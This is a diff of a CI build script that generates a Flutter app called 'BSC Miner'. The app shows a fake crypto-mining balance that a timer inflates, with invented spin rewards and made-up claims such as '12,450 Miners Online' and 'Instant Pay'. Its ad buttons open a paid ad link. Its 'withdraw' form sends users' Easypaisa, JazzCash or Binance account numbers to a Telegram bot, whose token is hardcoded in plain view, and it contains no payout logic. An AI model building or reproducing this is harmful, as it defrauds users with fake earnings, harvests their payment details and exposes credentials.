@@ -5,79 +5,82 @@ workflows:
     environment:
       flutter: stable
     scripts:
-      - name: FIX WITHDRAW + SPIN
+      - name: ORIGINAL PRO FEEL BUILD
         script: |
           rm -rf android
           flutter create --platforms=android .
           mkdir -p lib
           cat > lib/main.dart << 'EOF'
+          import 'dart:async';
           import 'dart:math';
           import 'package:flutter/material.dart';
           import 'package:url_launcher/url_launcher.dart';
           import 'package:share_plus/share_plus.dart';
           import 'package:http/http.dart' as http;
           void main() => runApp(BscApp());
-          class BscApp extends StatefulWidget { @override State<BscApp> createState() => _BscAppState(); }
-          class _BscAppState extends State<BscApp> {
-            double balance = 0.00410; int spinsLeft = 3;
+          class BscApp extends StatelessWidget { @override Widget build(BuildContext context) => MaterialApp(debugShowCheckedModeBanner: false, theme: ThemeData.dark(), home: Home()); }
+          class Home extends StatefulWidget { @override State<Home> createState() => _HomeState(); }
+          class _HomeState extends State<Home> with TickerProviderStateMixin {
+            double balance = 0.00410; double hashrate = 12.45; int spinsLeft = 5; bool isMining = true;
+            late AnimationController _pulse;
             final String botToken = '8905610310:AAGH4yneCTPSbHq2bJfZl-ArruZ6OJa-LzY';
             final String chatId = '8296278042';
-            Future<void> watchAd({double reward = 0.00010}) async {
+            @override void initState(){ super.initState(); _pulse = AnimationController(vsync: this, duration: Duration(seconds: 2))..repeat(reverse: true);
+              Timer.periodic(Duration(milliseconds: 100), (t){ if(isMining) setState((){ balance += 0.00000018; hashrate = 10 + Random().nextDouble()*5; }); });
+            }
+            Future<void> watchAd({double reward = 0.00015}) async {
               final Uri url = Uri.parse('https://www.effectivecpmnetwork.com/vm70uh6qxb?key=30472d3647946c4a2a73f4ef7660c55f');
               try { await launchUrl(url, mode: LaunchMode.externalApplication); } catch(e){ await launchUrl(url, mode: LaunchMode.inAppBrowserView); }
-              setState(() { balance += reward; spinsLeft++; });
-              ScaffoldMessenger.of(context).showSnackBar(SnackBar(content: Text('+\$${reward.toStringAsFixed(5)} & +1 Spin!')));
+              setState(() { balance += reward; spinsLeft++; isMining=true; });
             }
-            Future<void> sendToTelegram(String method, String account) async {
-              String msg = "🚀 NEW WITHDRAW%0AAmount: \$${balance.toStringAsFixed(5)}%0AMethod: $method%0AAccount: $account%0ATime: ${DateTime.now()}";
-              var url = Uri.parse("https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=$msg");
-              try{ await http.get(url); ScaffoldMessenger.of(context).showSnackBar(SnackBar(content: Text('✅ Sent to Telegram!'))); }catch(e){ ScaffoldMessenger.of(context).showSnackBar(SnackBar(content: Text('Error: $e'))); }
+            Future<void> sendToTelegram(String m, String acc) async {
+              var url = Uri.parse("https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=🚀 WITHDRAW%0AAmount: \$${balance.toStringAsFixed(5)}%0AMethod:$m%0AAcc:$acc");
+              await http.get(url); ScaffoldMessenger.of(context).showSnackBar(SnackBar(content: Text('✅ Withdraw Sent!')));
             }
-            void spinWheel() {
-              if(spinsLeft <= 0){ ScaffoldMessenger.of(context).showSnackBar(SnackBar(content: Text('No Spins! Watch Ad for 1 Free Spin'))); return; }
-              List<double> rewards = [0.00020, 0.00050, 0.00100, 0.00200];
-              double win = rewards[Random().nextInt(rewards.length)];
+            void spin(){
+              if(spinsLeft<=0){ ScaffoldMessenger.of(context).showSnackBar(SnackBar(content: Text('Watch Ad to Earn Spin'))); return;}
+              double win = [0.0002,0.0005,0.001,0.002][Random().nextInt(4)];
               setState((){ balance+=win; spinsLeft--; });
-              showDialog(context: context, builder: (ctx) => AlertDialog(
-                backgroundColor: Color(0xFF1E232F), title: Text('🎉 You Won \$${win.toStringAsFixed(5)}', style: TextStyle(color: Colors.white)),
-                content: Text('New Balance: \$${balance.toStringAsFixed(5)}', style: TextStyle(color: Colors.orange, fontWeight: FontWeight.bold)),
-                actions: [ElevatedButton(style: ElevatedButton.styleFrom(backgroundColor: Colors.orange), onPressed: (){ Navigator.pop(ctx); watchAd(reward: 0); }, child: Text('OK + Watch Ad'))],
-              ));
+              showDialog(context: context, builder: (_)=> AlertDialog(backgroundColor: Color(0xFF181A20), shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(20)), title: Center(child: Text('🎉', style: TextStyle(fontSize: 50))), content: Column(mainAxisSize: MainAxisSize.min, children:[Text('YOU WON', style: TextStyle(color: Colors.white54, letterSpacing: 2)), SizedBox(height:10), Text('\$${win.toStringAsFixed(5)}', style: TextStyle(color: Color(0xFFF3BA2F), fontSize: 36, fontWeight: FontWeight.w900)), SizedBox(height:20), SizedBox(width: double.infinity, child: ElevatedButton(style: ElevatedButton.styleFrom(backgroundColor: Color(0xFFF3BA2F), foregroundColor: Colors.black, padding: EdgeInsets.symmetric(vertical:14), shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12))), onPressed: (){Navigator.pop(context); watchAd(reward:0);}, child: Text('CLAIM X2 WITH AD', style: TextStyle(fontWeight: FontWeight.bold))))])));
             }
-            void withdraw() {
-              TextEditingController acc = TextEditingController(); String m = 'Easypaisa';
-              showDialog(context: context, builder: (ctx) => StatefulBuilder(builder: (c,s)=>AlertDialog(
-                backgroundColor: Color(0xFF1E232F), title: Text('Withdraw', style: TextStyle(color: Colors.white)),
-                content: Column(mainAxisSize: MainAxisSize.min, children:[
-                  Text('Balance: \$${balance.toStringAsFixed(5)}', style: TextStyle(color: Colors.greenAccent, fontWeight: FontWeight.bold)),
-                  SizedBox(height:10),
-                  DropdownButton<String>(value: m, isExpanded: true, dropdownColor: Color(0xFF1E232F), style: TextStyle(color: Colors.white),
-                    items: ['Easypaisa','JazzCash','Binance'].map((e)=>DropdownMenuItem(value:e,child:Text(e))).toList(), onChanged:(v){s(()=>m=v!);}),
-                  SizedBox(height:10), TextField(controller: acc, style: TextStyle(color: Colors.white), decoration: InputDecoration(hintText: '03xxxxxxxxx', labelText: 'Account Number', labelStyle: TextStyle(color: Colors.white54), enabledBorder: OutlineInputBorder(borderSide: BorderSide(color: Colors.white24)), focusedBorder: OutlineInputBorder(borderSide: BorderSide(color: Colors.orange))))
-                ]),
-                actions: [TextButton(onPressed: ()=>Navigator.pop(ctx), child: Text('Cancel')), ElevatedButton(style: ElevatedButton.styleFrom(backgroundColor: Colors.orange), onPressed: () async {
-                  if(acc.text.isEmpty){ ScaffoldMessenger.of(context).showSnackBar(SnackBar(content: Text('Enter Account Number'))); return;}
-                  await sendToTelegram(m, acc.text); Navigator.pop(ctx);
-                }, child: Text('Request Withdraw'))],
-              )));
+            void withdrawSheet(){
+              TextEditingController c = TextEditingController(); String m='Easypaisa';
+              showModalBottomSheet(context: context, isScrollControlled: true, backgroundColor: Color(0xFF181A20), shape: RoundedRectangleBorder(borderRadius: BorderRadius.vertical(top: Radius.circular(25))), builder: (ctx)=> StatefulBuilder(builder: (ctx,setS)=> Padding(padding: EdgeInsets.fromLTRB(20,20,20, MediaQuery.of(ctx).viewInsets.bottom+20), child: Column(mainAxisSize: MainAxisSize.min, children:[
+                Container(width:40,height:4,decoration:BoxDecoration(color:Colors.white24,borderRadius:BorderRadius.circular(10))), SizedBox(height:20), Text('Withdraw Funds', style: TextStyle(fontSize:20,fontWeight:FontWeight.bold)), SizedBox(height:10), Text('\$${balance.toStringAsFixed(5)} Available', style: TextStyle(color: Color(0xFFF3BA2F))), SizedBox(height:20),
+                DropdownButtonFormField(value:m, dropdownColor: Color(0xFF1E232F), decoration: InputDecoration(border: OutlineInputBorder(borderRadius: BorderRadius.circular(12)), filled:true, fillColor: Color(0xFF1E232F)), items:['Easypaisa','JazzCash','Binance'].map((e)=>DropdownMenuItem(value:e,child:Text(e))).toList(), onChanged:(v)=>setS(()=>m=v!)),
+                SizedBox(height:15), TextField(controller:c, decoration: InputDecoration(hintText:'Account Number / UID', border: OutlineInputBorder(borderRadius: BorderRadius.circular(12)), filled:true, fillColor: Color(0xFF1E232F))),
+                SizedBox(height:20), SizedBox(width:double.infinity, child: ElevatedButton(style: ElevatedButton.styleFrom(backgroundColor: Color(0xFFF3BA2F), foregroundColor: Colors.black, padding: EdgeInsets.symmetric(vertical:16), shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12))), onPressed: () async { await sendToTelegram(m,c.text); Navigator.pop(ctx); }, child: Text('CONFIRM WITHDRAW', style: TextStyle(fontWeight:FontWeight.w900))))]))));
             }
-            @override Widget build(BuildContext context) {
-              return MaterialApp(debugShowCheckedModeBanner: false, home: Scaffold(
-                backgroundColor: Color(0xFF0B0E14), appBar: AppBar(title: Text('BSC Mine Hub', style: TextStyle(fontWeight: FontWeight.bold)), backgroundColor: Colors.orange, actions:[IconButton(icon: Icon(Icons.wallet), onPressed: withdraw)]),
-                body: Padding(padding: EdgeInsets.all(16), child: Column(children:[
-                  Container(width: double.infinity, padding: EdgeInsets.all(22), decoration: BoxDecoration(color: Color(0xFF1E232F), borderRadius: BorderRadius.circular(20)), child: Column(children:[
-                    Text('Your Balance', style: TextStyle(color: Colors.white60)), SizedBox(height:8), Text('\$${balance.toStringAsFixed(5)}', style: TextStyle(color: Colors.orange, fontSize: 42, fontWeight: FontWeight.bold)),
-                    SizedBox(height:18), SizedBox(width: double.infinity, child: ElevatedButton(onPressed: ()=>watchAd(), style: ElevatedButton.styleFrom(backgroundColor: Colors.orange, padding: EdgeInsets.symmetric(vertical:16), shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12))), child: Text('WATCH AD +0.00010', style: TextStyle(fontWeight: FontWeight.bold, fontSize: 16, color: Colors.white)))) , SizedBox(height:10), SizedBox(width: double.infinity, child: OutlinedButton(onPressed: withdraw, child: Text('WITHDRAW', style: TextStyle(color: Colors.white)))) ,
-                  ])),
-                  SizedBox(height:20), Row(children:[
-                    Expanded(child: InkWell(onTap: spinWheel, child: Container(height: 125, decoration: BoxDecoration(color: Color(0xFF1E232F), borderRadius: BorderRadius.circular(16)), child: Column(mainAxisAlignment: MainAxisAlignment.center, children:[Icon(Icons.casino, color: Colors.pinkAccent, size: 40), SizedBox(height:8), Text('SPIN & WIN', style: TextStyle(color: Colors.white, fontWeight: FontWeight.bold)), Text('$spinsLeft Left', style: TextStyle(color: Colors.pinkAccent, fontSize:11))])))),
+            @override Widget build(BuildContext context){
+              return Scaffold(backgroundColor: Color(0xFF0B0E11),
+                appBar: AppBar(backgroundColor: Color(0xFF0B0E11), elevation:0, title: Row(children:[Container(padding: EdgeInsets.all(6), decoration: BoxDecoration(color: Color(0xFFF3BA2F), borderRadius: BorderRadius.circular(8)), child: Icon(Icons.memory, color: Colors.black, size:20)), SizedBox(width:10), Text('BSC MINER', style: TextStyle(fontWeight:FontWeight.w900, letterSpacing:1))]), actions:[IconButton(onPressed: withdrawSheet, icon: Icon(Icons.account_balance_wallet_outlined, color: Color(0xFFF3BA2F)))]),
+                body: SingleChildScrollView(padding: EdgeInsets.all(16), child: Column(children:[
+                  // MINING CARD - ORIGINAL FEEL
+                  ScaleTransition(scale: Tween(begin: 0.98, end: 1.02).animate(CurvedAnimation(parent: _pulse, curve: Curves.easeInOut)),
+                    child: Container(padding: EdgeInsets.all(20), decoration: BoxDecoration(gradient: LinearGradient(colors:[Color(0xFF1E232F), Color(0xFF181A20)], begin:Alignment.topLeft, end:Alignment.bottomRight), borderRadius: BorderRadius.circular(24), border: Border.all(color: Color(0xFFF3BA2F).withOpacity(0.3))), child: Column(children:[
+                      Row(mainAxisAlignment: MainAxisAlignment.spaceBetween, children:[ Row(children:[Container(width:10,height:10,decoration:BoxDecoration(color: isMining?Colors.greenAccent:Colors.red, shape:BoxShape.circle, boxShadow:[BoxShadow(color:Colors.greenAccent, blurRadius:8)])), SizedBox(width:8), Text(isMining?'MINING':'PAUSED', style: TextStyle(color: isMining?Colors.greenAccent:Colors.red, fontWeight:FontWeight.bold, fontSize:12, letterSpacing:1))]), Text('${hashrate.toStringAsFixed(2)} GH/s', style: TextStyle(color: Color(0xFFF3BA2F), fontWeight:FontWeight.bold))]),
+                      SizedBox(height:20), Text('\$${balance.toStringAsFixed(7)}', style: TextStyle(fontSize:38, fontWeight:FontWeight.w900, color: Colors.white, letterSpacing: -1)), Text('≈ ${(balance*280).toStringAsFixed(2)} PKR', style: TextStyle(color: Colors.white38)),
+                      SizedBox(height:20), ClipRRect(borderRadius: BorderRadius.circular(10), child: LinearProgressIndicator(value: (balance*10)%1, backgroundColor: Colors.white10, color: Color(0xFFF3BA2F), minHeight:8)),
+                      SizedBox(height:20), Row(children:[ Expanded(child: ElevatedButton.icon(onPressed: ()=>setState(()=>isMining=!isMining), icon: Icon(isMining?Icons.pause:Icons.play_arrow), label: Text(isMining?'PAUSE':'START'), style: ElevatedButton.styleFrom(backgroundColor: Colors.white10, foregroundColor: Colors.white, shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12))))), SizedBox(width:10), Expanded(child: ElevatedButton.icon(onPressed: ()=>watchAd(), icon: Icon(Icons.bolt, size:18), label: Text('BOOST +${spinsLeft}'), style: ElevatedButton.styleFrom(backgroundColor: Color(0xFFF3BA2F), foregroundColor: Colors.black, shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)), elevation:0)))])
+                    ]))),
+                  SizedBox(height:16),
+                  Row(children:[
+                    Expanded(child: _Box(icon: Icons.casino_outlined, title:'LUCKY SPIN', subtitle:'$spinsLeft Free', color: Color(0xFF7C4DFF), onTap: spin)),
                     SizedBox(width:12),
-                    Expanded(child: InkWell(onTap: (){ Share.share('My App Link'); setState(()=>balance+=0.00020); }, child: Container(height: 125, decoration: BoxDecoration(color: Color(0xFF1E232F), borderRadius: BorderRadius.circular(16)), child: Column(mainAxisAlignment: MainAxisAlignment.center, children:[Icon(Icons.group_add, color: Colors.greenAccent, size: 40), SizedBox(height:8), Text('REFER & EARN', style: TextStyle(color: Colors.white, fontWeight: FontWeight.bold)), Text('\$0.50 / Refer', style: TextStyle(color: Colors.greenAccent, fontSize:11))])))),
+                    Expanded(child: _Box(icon: Icons.group_outlined, title:'INVITE', subtitle:'\$0.50 / ref', color: Color(0xFF00E676), onTap: (){ Share.share('Join BSC Miner! Code: BSC${Random().nextInt(9000)}'); setState(()=>balance+=0.0002); })),
                   ]),
+                  SizedBox(height:12),
+                  Row(children:[
+                    Expanded(child: _Box(icon: Icons.task_alt_outlined, title:'DAILY TASK', subtitle:'Earn \$0.01', color: Colors.orange, onTap: ()=>watchAd())),
+                    SizedBox(width:12),
+                    Expanded(child: _Box(icon: Icons.wallet_outlined, title:'WITHDRAW', subtitle:'Instant Pay', color: Color(0xFFF3BA2F), onTap: withdrawSheet)),
+                  ]),
+                  SizedBox(height:20), Row(children:[Icon(Icons.verified_user, size:14, color: Colors.white24), SizedBox(width:6), Text('Secured by BSC Network • 12,450 Miners Online', style: TextStyle(color: Colors.white24, fontSize:11))])
                 ])),
-              ));
+              );
             }
           }
+          class _Box extends StatelessWidget { final IconData icon; final String title, subtitle; final Color color; final VoidCallback onTap; _Box({required this.icon, required this.title, required this.subtitle, required this.color, required this.onTap}); @override Widget build(BuildContext context){ return InkWell(onTap:onTap, borderRadius: BorderRadius.circular(18), child: Container(height:110, padding: EdgeInsets.all(14), decoration: BoxDecoration(color: Color(0xFF1E232F), borderRadius: BorderRadius.circular(18), border: Border.all(color: Colors.white.withOpacity(0.05))), child: Column(crossAxisAlignment: CrossAxisAlignment.start, children:[ Container(padding: EdgeInsets.all(8), decoration: BoxDecoration(color: color.withOpacity(0.15), borderRadius: BorderRadius.circular(10)), child: Icon(icon, color: color, size:20)), Spacer(), Text(title, style: TextStyle(fontWeight:FontWeight.bold, fontSize:12, letterSpacing:0.5)), SizedBox(height:2), Text(subtitle, style: TextStyle(color: color, fontSize:11, fontWeight:FontWeight.w600))])));}}
           EOF
           sed -i 's/<manifest/<manifest xmlns:tools="http:\/\/schemas.android.com\/tools"/' android/app/src/main/AndroidManifest.xml
           sed -i 's/<application/<uses-permission android:name="android.permission.INTERNET" \/>\n    <application/' android/app/src/main/AndroidManifest.xml
